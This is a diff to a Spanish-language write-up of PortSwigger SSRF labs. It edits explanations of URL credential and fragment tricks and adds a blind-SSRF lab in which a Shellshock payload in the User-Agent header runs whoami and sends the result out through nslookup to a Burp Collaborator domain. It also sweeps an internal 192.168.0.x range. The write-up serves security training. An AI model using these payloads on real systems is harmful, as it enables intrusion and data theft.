@@ -535,7 +535,7 @@ Así que nuestra petición quedará algo así al aplicar el login:
 
 `stockApi=http://user:password@stock.weliketoshop.net:8080/product/stock/check?productId=1%26storeId=1`
 
-Vemos que hemos agregado los valores **user:password**, y el @ es para indicarle que será del host que le sigue.
+Vemos que hemos agregado los valores **user:password**, y el @ es para indicarle el host al que se loguearan estos usuarios.
 
 Y al tramitar la petición:
 
@@ -553,6 +553,8 @@ Ahora vemos que quitando el apartado de password nos sigue dando una respuesta c
 
 ![user](/assets/images/LabsSSRF/lab6/user.png)
 
+Con esto podemos estar más seguros de que es vulnerable.
+
 Algo curioso que notamos es que en cada consulta nos devuelve un valor diferente en el contenido de la petición.
 
 > Este metodo de login desde la URL puede ser util si tenemos credenciales conseguidas por algun otro lado, tal vez desde algún LFI, etc.
@@ -563,13 +565,13 @@ Ahora como sabemos que es posible lo de login, haremos lo siguiente:
 
 `stockApi=http://localhost#@stock.weliketoshop.net:8080`
 
-Lo que estamos haciendo aquí es acceder al dominio localhost, y después usando el simbolo de #, lo que nos permite es identificar un fragmento de la web para que nos lleve a la parte de la web donde esta ese fragmento.
+Lo que estamos haciendo aquí es acceder al dominio localhost en lugar de indicarle un usuario o password, y después usando el simbolo de #, lo que nos permite es identificar un fragmento de la web para que nos lleve a la parte de la web donde esta ese fragmento.
 
 Por ejemplo si hay una web con muchos textos pero solo queremos encontrar alguno, entonces usamos el # y pasarle el fragmento identificador y esto automaticamente nos llevara a la sección donde se encuentra esos datos.
 
 <br>
 
-Pero en este caso estamos usandolo en la URL que queremos que nos lleve, así que como es vulnerable, esto nos llevará a la página localhost en la sección del dominio `stock.weliketoshop.net:8080`, pero esta vez nos estará llevando a ese lugar y no solo traer un valor para mostrarlo como lo hace por defecto.
+Pero en este caso estamos usandolo en la URL que queremos que nos lleve, así que como es vulnerable, esto nos llevará a la página del dominio `stock.weliketoshop.net:8080`, pero esta vez nos estará llevando a ese lugar y no solo traer un valor para mostrarlo como lo hace por defecto que era lo del valor de existencias de productos.
 
 Obviamente antes de tramitar esta petición debemos URL-encodear el simbolo # para evitar errores de sintaxis:
 
@@ -621,3 +623,123 @@ Vemos que hemos logrado eliminar el usuario carlos y hemos terminado el laborato
 
 <br>
 
+# Laboratorio 7: SSRF ciego con explotación de Shellshock
+
+En este último laboratorio nos estan pidiendo lo siguiente:
+
+![lab7](/assets/images/LabsSSRF/lab7/lab7.png)
+
+Nos dice que este sitio web de la tienda contiene una función de analisis la cual obtiene la URL del apartado referer de la cabecera(header), de la petición.
+
+Y esta función lo que hace es hacerle una petición a esa URL que se encuentra en el referer de la petición.
+
+Después nos dice que debemos usar esa funcionalidad para manifestar un ataque SSRF ciego(blind).
+
+Nos dice que existe un servidor interno por el puerto 8080 el cual se encuentra en el rango de 192.168.0.X.
+
+Y que debemos hacer un ataque de shellshok, para filtrar el nombre de usuario del sistema operativo que se ejecuta en el servidor interno.
+
+<br>
+
+Primero interceptaremos la petición al elegir un producto:
+
+![peticion](/assets/images/LabsSSRF/lab7/peticion.png)
+
+Sabemos que en la parte de referer esta la función de analisis la cual el mismo servidor hace una petición a la URL que se encuentra dentro del referer.
+
+Que en este caso esa url es: 
+
+`Referer: https://0a8700a104027f96841aea6200990051.web-security-academy.net/`
+
+Así que cambiaremos esa URL por la del BurpCollaborator, que como sabemos con el BurpCollaborator podemos activar un servidor tercero que se conectará y tendremos acceso al registro del servidor tercero y ver las consultas, respuestas etc.
+
+Cambiaremos esa URL por la del collaborator quedandonos así:
+
+`Referer: http://0vw1bgzla4s8l1spkyfoxv2ho8uyin.burpcollaborator.net`
+
+Y al tramitar esta petición veremos que se tramita con exito:
+
+![200](/assets/images/LabsSSRF/lab7/200.png)
+
+Así que desde el BurpCollaborator debemos ver si recibimos alguna petición desde la petición anterirmente tramitada gracias al referer:
+
+![collaborator](/assets/images/LabsSSRF/lab7/collaborator.png)
+
+Y podemos apreciar que en efecto hemos recibido una petición HTTP y 2 DNS.
+
+<br>
+
+Así que con esto comprobamos que es vulnerable a SSRF ya que estamos enviando peticiónes hacia otros lugares que no deberian poderse pero como es vulnerable es posible.
+
+En la petición que recibimos del BurpCollaborator apreciamos que se esta enviando el Host, y el User-Agent en la cabecera de la petición recibida.
+
+Así que como recordamos nos dice que alguna IP en el rango de 192.168.0.X:8080 es vulnerable a Shellshock.
+
+Y como vemos 2 cabeceras en la respuesta, podemos pensar que es posible que la cabecera vulnerable sea la de User-Agent, por lo que iremos a la petición que tenemos en el repeater y agregaremos el payload de shellshock en el User-Agent:
+
+`User-Agent: () { :; }; /ruta/del/comando`
+
+Lo que hace esta vulnerabilidad es permitirnos ejecutar comandos desde la cabecera del user-agent, y necesitamos ver la respuesta, para ello usaremos lo siguiente.
+
+<br>
+
+El comando nslookup nos sirve para consultar nombres de Dominio en un servidor dado. y para saber esa informacion debe hacer consultas DNS.
+
+Y como recordamos, en la parte vulnerable del SSRF tramita peticiónes DNS, por lo que nos permitira hacerlo.
+
+Así que usaremos ese comando, pero no nos interesa saber el nombre del dominio ni recibiremos la respuesta de ese comando, pero lo que si hara será enviar consultas DNS que usaremos mas adenlante, que usaremos para obtener el usuario del sistema operativo que ejecuta el servidor externo, así que lo que haremos será que le agregaremos al comando nuestro servidor tercero de BurpCollaborator.
+
+Quedandonos así:
+
+
+`User-Agent: () { :; }; /usr/bin/nslookup 3sw48jwo77pbi4psh1cruyzklbr2fr.burpcollaborator.net`
+
+Así que esto esta casi terminado, pero recordemos que no nos interesa ver el nombre del dominio, si no que quremos ver el usuario, y para ello podemos concatenar junto a el servidor destino un comando.
+
+Quedando nuestro User-Agent de la siguiente manera:
+
+`User-Agent: () { :; }; /usr/bin/nslookup $(whoami).3sw48jwo77pbi4psh1cruyzklbr2fr.burpcollaborator.net`
+
+Así que de esta forma, en la respuesta DNS que recibiremos no se verá la respuesta de lo que ejecuta el comando nslookup, pero como este comando tramita peticiones DNS, y en el servidor tercero al cual enviara esas peticiones vemos que le concatenamos el comando whoami, entonces en la respuesta DNS, en teoria deberemos recibir la respuesta del comando whoami junto a lo que el comando nslookup haga por los DNS.
+
+<br>
+
+Así que nuestro payload quedará así:
+
+![shellshock](/assets/images/LabsSSRF/lab7/shellshock.png)
+
+Por último, recordemos que esta petición debe enviarse a un host que esta entre el rango de 192.168.0.X:8080, así que para saber esto, haremos un ataque de tipo sniper desde el intruder de Burpsuite, así que una vez mandemos esta petición a el intruder, agregaremos en el referer el valor que será fuzzeado quedando así:
+
+`Referer: http://192.168.0.1:8080`
+
+![uno](/assets/images/LabsSSRF/lab7/uno.png)
+
+Vemos que hemos agregado el payload en el final de la IP, esto para irla fuzzeando del 1 hasta el 254, y para esto iremos a payloads, y configuraremos lo siguiente:
+
+![payloads](/assets/images/LabsSSRF/lab7/payloads.png)
+
+Así que ahora vemos que configuramos el payload de tipo numerico, que irá en secuencia del 1 a el 254 avanzando de 1 en 1.
+
+Así que nos hara 254 peticiones fuzzeando ese valor al dar al start attack:
+
+![254](/assets/images/LabsSSRF/lab7/254.png)
+
+Todas se tramitaron correctamente, así que ahora iremos a el apartado de BurpCollaborator y apreciar si recibimos algo:
+
+![DNS](/assets/images/LabsSSRF/lab7/dns.png)
+
+Podemos leer en la respuesta que ha funcionado nuestro SSRF para acontecer un Shellshock.
+
+Podemos ver la siguiente respuesta:
+
+**"The Collaborator server received a DNS lookup of type A for the domain name peter-qxVswP.75afxrv2m8w5l5o1fx52kjq9i0orcg.burpcollaborator.net."**
+
+Vemos que primero nos dice peter-qxVswP, seguido de la respuesta por defecto.
+
+En resumen aprovechamos el SSRF para através de un shellshock recibir consultas DNS hacia nuestro servidor y como aprovechamos que con el comando nslookup podemos hacer que el servidor tramite peticiones DNS entonces incluimos lo que nos interesa en la respuesta DNS en este caso el comando whoami.
+
+Y habremos terminado el laboratorio al poner ese usuario en la flag:
+
+![end](/assets/images/LabsSSRF/lab7/end.png)
+
+Y con este habremos completado todos los laboratorios de SSRF en Portswigger.
